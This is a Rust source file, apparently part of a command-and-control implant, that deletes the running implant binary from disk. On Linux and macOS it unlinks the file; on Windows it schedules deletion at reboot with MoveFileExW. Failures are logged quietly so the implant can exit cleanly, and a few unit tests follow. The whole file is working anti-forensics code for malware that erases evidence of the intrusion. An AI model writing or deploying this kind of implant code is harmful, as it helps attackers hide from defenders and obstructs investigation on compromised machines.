//! Cross-platform self-deletion of the implant binary.
//!
//! # Platform behaviour
//!
//! - **Linux / macOS**: `unlink(2)` via `std::fs::remove_file`.  POSIX guarantees that
//!   an already-open file can be unlinked; processes that have the file open continue
//!   to use their file descriptor.  The directory entry disappears immediately.
//!
//! - **Windows**: The file is still mapped into the process address space, so it
//!   cannot be deleted while running.  We fall back to scheduling deletion at next
//!   reboot via `MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)`.  If that
//!   also fails (e.g. insufficient privileges) the error is **logged but does not
//!   propagate** — task results are already written to the pipe so it is better to
//!   exit cleanly and let an operator clean up the binary.

use log::warn;

/// Attempt to delete the currently-running binary.
///
/// Returns `Ok(())` if the deletion succeeded or was scheduled.
/// Returns `Err` only when the path cannot even be determined.
/// Failures in the actual delete are swallowed with a warning to avoid
/// interfering with result reporting.
pub fn self_delete() -> Result<(), std::io::Error> {
    let exe = std::env::current_exe()?;
    self_delete_path(&exe)
}

/// Inner function that accepts an explicit path (testable without spawning a
/// real process).
pub fn self_delete_path(path: &std::path::Path) -> Result<(), std::io::Error> {
    #[cfg(unix)]
    {
        delete_unix(path);
    }
    #[cfg(windows)]
    {
        delete_windows(path);
    }
    #[cfg(not(any(unix, windows)))]
    {
        warn!("self_delete not supported on this platform; skipping");
    }
    Ok(())
}

#[cfg(unix)]
fn delete_unix(path: &std::path::Path) {
    if let Err(e) = std::fs::remove_file(path) {
        warn!("self_delete: unlink {path:?} failed: {e}");
    }
}

#[cfg(windows)]
fn delete_windows(path: &std::path::Path) {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows::Win32::Storage::FileSystem::{MoveFileExW, MOVEFILE_DELAY_UNTIL_REBOOT};

    let wide: Vec<u16> = OsStr::new(path).encode_wide().chain(once(0)).collect();

    // SAFETY: wide is a valid null-terminated UTF-16 string; null destination
    // is the documented way to schedule deletion on reboot.
    let ok = unsafe {
        MoveFileExW(
            windows::core::PCWSTR(wide.as_ptr()),
            windows::core::PCWSTR::null(),
            MOVEFILE_DELAY_UNTIL_REBOOT,
        )
    };

    if let Err(e) = ok {
        warn!("self_delete: MoveFileExW {path:?} failed: {e}; file will remain");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::NamedTempFile;

    #[test]
    #[cfg(unix)]
    fn test_self_delete_path_removes_file_on_unix() {
        // Arrange
        let tmp = NamedTempFile::new().unwrap();
        let path = tmp.path().to_owned();
        // Persist so NamedTempFile doesn't auto-delete
        let _ = tmp.into_temp_path(); // leak path
        fs::write(&path, b"dummy").unwrap();

        // Act
        self_delete_path(&path).unwrap();

        // Assert
        assert!(!path.exists(), "file should have been deleted");
    }

    #[test]
    fn test_self_delete_path_missing_file_does_not_propagate() {
        // Arrange — path does not exist
        let path = std::path::PathBuf::from("/nonexistent/implant_binary_xyz");

        // Act — should not return Err (delete failure is logged, not propagated)
        let result = self_delete_path(&path);

        // Assert
        assert!(result.is_ok(), "should return Ok even when file missing");
    }

    #[test]
    fn test_self_delete_returns_ok_when_path_resolved() {
        // Just ensure current_exe() is available; actual delete is skipped
        // in tests because the test binary should not delete itself.
        let exe = std::env::current_exe();
        assert!(exe.is_ok(), "current_exe should resolve in test context");
    }
}
